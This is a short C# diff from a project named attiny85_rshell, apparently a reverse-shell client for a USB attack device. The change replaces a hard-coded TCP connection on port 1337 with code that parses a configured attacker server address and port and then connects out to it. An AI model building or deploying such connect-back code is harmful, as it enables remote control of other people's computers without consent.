@@ -38,7 +38,13 @@ namespace attiny85_rshell {
             Regex re2 = new Regex(@"(https://|http://)([0-9.]+)");
             bool is_err = false;
             try {
-                this.MasterClientObject = new TcpClient("", 1337);
+                if (re1.IsMatch(this.server_ip)) {
+                    this.MasterClientObject = new TcpClient(re1.Replace(this.server_ip,"$2"), this.server_port);
+                } else if (re2.IsMatch(this.server_ip)) {
+                    this.MasterClientObject = new TcpClient(re2.Replace(this.server_ip, "$2"), this.server_port);
+                } else {
+                    return "MasterClient:StartClient:error - Unrecognized destination format.";
+                }
                 this.MasterClientObject.ReceiveTimeout = 10000;
 	            NetworkStream stream = this.MasterClientObject.GetStream();
 	            stream.ReadTimeout = 10000;
